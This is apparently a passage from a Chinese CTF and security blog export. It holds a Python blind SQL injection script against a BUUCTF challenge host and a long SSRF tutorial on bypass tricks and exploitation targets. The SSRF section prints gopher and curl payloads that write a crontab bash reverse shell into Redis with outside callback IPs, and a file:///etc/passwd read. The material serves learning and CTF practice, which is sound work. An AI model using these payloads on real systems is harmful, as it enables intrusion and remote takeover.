<h1 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://35737a35-63b7-4e60-a584-e5cbbead6dc6.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_table=<span class="string">&#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        payload = payload_table.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>脚本</category>
      </categories>
      <tags>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2022/03/12/ssrf/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="1-含义"><a href="#1-含义" class="headerlink" title="1.含义"></a>1.<strong>含义</strong></h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<h2 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2.漏洞危害"></a>2.漏洞危害</h2><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
<h2 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p>
<h4 id="dict：-可以探测端口"><a href="#dict：-可以探测端口" class="headerlink" title="dict：//可以探测端口"></a>dict：//可以探测端口</h4><h4 id="ftp协议-文件传输协议"><a href="#ftp协议-文件传输协议" class="headerlink" title="ftp协议  文件传输协议"></a>ftp协议  文件传输协议</h4><h4 id="file协议-专门读取本机文件的协议"><a href="#file协议-专门读取本机文件的协议" class="headerlink" title="file协议  专门读取本机文件的协议"></a>file协议  专门读取本机文件的协议</h4><p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line"></span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line"></span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="4-相关危险函数"><a href="#4-相关危险函数" class="headerlink" title="4. 相关危险函数"></a>4. 相关危险函数</h2><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 </p>
<p><code>file_get_contents()</code> / <code>fsockopen()</code> / <code>curl_exec()</code> 等。</p>
<h2 id="5-过滤绕过"><a href="#5-过滤绕过" class="headerlink" title="5.过滤绕过"></a>5.过滤绕过</h2><h3 id="更改IP地址写法"><a href="#更改IP地址写法" class="headerlink" title="更改IP地址写法"></a>更改IP地址写法</h3><p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>
<ul>
<li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$</code></li>
<li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</code></li>
<li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</code></li>
</ul>
<p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p>
<ul>
<li>8进制格式：0300.0250.0.1</li>
<li>16进制格式：0xC0.0xA8.0.1</li>
<li>10进制整数格式：3232235521</li>
<li>16进制整数格式：0xC0A80001</li>
<li>合并后两位：1.1.278 / 1.1.755</li>
<li>合并后三位：1.278 / 1.755 / 3.14159267</li>
</ul>
<p>另外IP中的每一位，各个进制可以混用。</p>
<p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p>
<p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p>
<h3 id="xip-io使用解析到内网的域名"><a href="#xip-io使用解析到内网的域名" class="headerlink" title="xip.io使用解析到内网的域名"></a>xip.io使用解析到内网的域名</h3><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p>
<p>另外 <code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。</p>
<h3 id="利用解析URL所出现的问题"><a href="#利用解析URL所出现的问题" class="headerlink" title="利用解析URL所出现的问题"></a>利用解析URL所出现的问题</h3><p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
<p>比如 <code>http://www.baidu.com@192.168.0.1/</code> 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href="http://www.baidu.com,认为是访问请求的host地址时)对上述url的内容进行解析的时候,很有可能会认为访问url的host为www.baidu.com,而实际上这个url所请求的内容都是192.168.0.1上的内容./">www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</a></p>
<h3 id="利用跳转"><a href="#利用跳转" class="headerlink" title="利用跳转"></a>利用跳转</h3><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>
<p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>
<p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p>
<h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p>
<p>比如通过<strong>gopher</strong>，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>

<p>除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 <code>file:///path/to/file</code> 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 <code>file:///d:/1.txt</code> 来访问D盘中1.txt的内容。</p>
<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
<ul>
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
</ul>
<h3 id="利用IPv6"><a href="#利用IPv6" class="headerlink" title="利用IPv6"></a>利用IPv6</h3><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤。</p>
<h3 id="利用IDN"><a href="#利用IDN" class="headerlink" title="利用IDN"></a>利用IDN</h3><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
<h3 id="短网址绕过"><a href="#短网址绕过" class="headerlink" title="短网址绕过"></a>短网址绕过</h3><h3 id="限制了子网段，可以加-80-端口绕过"><a href="#限制了子网段，可以加-80-端口绕过" class="headerlink" title="限制了子网段，可以加 :80 端口绕过"></a>限制了子网段，可以加 :80 端口绕过</h3><h3 id="探测内网域名，或者将自己的域名解析到内网ip"><a href="#探测内网域名，或者将自己的域名解析到内网ip" class="headerlink" title="探测内网域名，或者将自己的域名解析到内网ip"></a>探测内网域名，或者将自己的域名解析到内网ip</h3><p>如 <a href="http://10.153.138.81/ts.php">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，但这样可以用 <a href="http://abc@10.153.138.81/">http://abc@10.153.138.81/</a> 绕过</p>
<h3 id="http-abc-com-127-0-0-1"><a href="#http-abc-com-127-0-0-1" class="headerlink" title="@　　　http://abc.com@127.0.0.1"></a>@　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></h3><h2 id="6-可能的利用点"><a href="#6-可能的利用点" class="headerlink" title="6. 可能的利用点"></a>6. 可能的利用点</h2><h3 id="内网服务"><a href="#内网服务" class="headerlink" title="内网服务"></a>内网服务</h3><ul>
<li>Apache Hadoop远程命令执行</li>
<li>axis2-admin部署Server命令执行</li>
<li>Confluence SSRF</li>
<li>counchdb WEB API远程命令执行</li>
<li>dict</li>
<li>docker API远程命令执行</li>
<li>Elasticsearch引擎Groovy脚本命令执行</li>
<li>ftp / ftps（FTP爆破）</li>
<li>glassfish任意文件读取和war文件部署间接命令执行</li>
<li>gopher</li>
<li>HFS远程命令执行</li>
<li>http、https</li>
<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>
<li>Java调试接口命令执行</li>
<li>JBOSS远程Invoker war命令执行</li>
<li>Jenkins Scripts接口命令执行</li>
<li>ldap</li>
<li>mongodb</li>
<li>php_fpm/fastcgi 命令执行</li>
<li>rtsp - smb/smbs（连接SMB）</li>
<li>sftp</li>
<li>ShellShock 命令执行</li>
<li>Struts2 命令执行</li>
<li>telnet</li>
<li>tftp（UDP协议扩展）</li>
<li>tomcat命令执行</li>
<li>WebDav PUT上传任意文件</li>
<li>WebSphere Admin可部署war间接命令执行</li>
<li>zentoPMS远程命令执行</li>
</ul>
<h3 id="Redis利用"><a href="#Redis利用" class="headerlink" title="Redis利用"></a>Redis利用</h3><ul>
<li>写ssh公钥</li>
<li>写crontab</li>
<li>写WebShell</li>
<li>Windows写启动项</li>
<li>主从复制加载 .so 文件</li>
<li>主从复制写无损文件</li>
</ul>
<h3 id="云主机"><a href="#云主机" class="headerlink" title="云主机"></a>云主机</h3><p>在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。</p>
<p><strong>1.让服务端去访问相应的网址</strong></p>
<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
<p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p>
<h2 id="7-防御方式"><a href="#7-防御方式" class="headerlink" title="7. 防御方式"></a>7. 防御方式</h2><ul>
<li>过滤返回的信息</li>
<li>统一错误信息</li>
<li>限制请求的端口</li>
<li>禁止不常用的协议</li>
<li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</li>
</ul>
<h2 id="8-作用"><a href="#8-作用" class="headerlink" title="8.作用"></a>8.作用</h2><h3 id="隐藏自己"><a href="#隐藏自己" class="headerlink" title="隐藏自己"></a>隐藏自己</h3><h3 id="进入内网渗透"><a href="#进入内网渗透" class="headerlink" title="进入内网渗透"></a>进入内网渗透</h3><p>主流防御 -&gt; 外网防护强，内网防护弱</p>
<h3 id="更好地对存在SSRF漏洞进行攻击"><a href="#更好地对存在SSRF漏洞进行攻击" class="headerlink" title="更好地对存在SSRF漏洞进行攻击"></a>更好地对存在SSRF漏洞进行攻击</h3><p>mysql默认不允许外部访问，但对于本地没有防护</p>
<h3 id="扫描内部网络"><a href="#扫描内部网络" class="headerlink" title="扫描内部网络"></a>扫描内部网络</h3><h3 id="向内部任意主机的任意端口发送精心构造的数据包（payload）"><a href="#向内部任意主机的任意端口发送精心构造的数据包（payload）" class="headerlink" title="向内部任意主机的任意端口发送精心构造的数据包（payload）"></a>向内部任意主机的任意端口发送精心构造的数据包（payload）</h3><h3 id="DOS（请求大文件，始终保持连接Keep-Alive-Always）"><a href="#DOS（请求大文件，始终保持连接Keep-Alive-Always）" class="headerlink" title="DOS（请求大文件，始终保持连接Keep-Alive Always）"></a>DOS（请求大文件，始终保持连接Keep-Alive Always）</h3><h3 id="暴力穷举（users、files等）"><a href="#暴力穷举（users、files等）" class="headerlink" title="暴力穷举（users、files等）"></a>暴力穷举（users、files等）</h3><h3 id="9-漏洞存在地方"><a href="#9-漏洞存在地方" class="headerlink" title="9.漏洞存在地方"></a>9.漏洞存在地方</h3><p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<p>13.出现协议的地方</p>
<p>​         很可能可以发起请求</p>
<p>14.出现文件后缀 </p>
<p>​          有可能存在任意文件读取</p>
<p>​          Download=xxxx/xxx/xx</p>
<h2 id="10-ssrf中的别样技巧"><a href="#10-ssrf中的别样技巧" class="headerlink" title="10.ssrf中的别样技巧"></a>10.ssrf中的别样技巧</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&mid=2247484267&idx=1&sn=0a5526ad149631ae6a2501b4d7cd3e0d&chksm=c01a845df76d0d4bc1e2967487a5678f0a8bd31a3cce108b8ca1c7cfdf5cf7d6969e672d3089&mpshare=1&scene=23&srcid=0308IBGVi6qRrVd6R8a0qiyG&sharer_sharetime=1646699219146&sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd">SSRF中的别样技巧 (qq.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>kuangjia</title>
    <url>/2022/03/14/kuangjia/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>postjwt</title>
    <url>/2022/03/14/postjwt/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
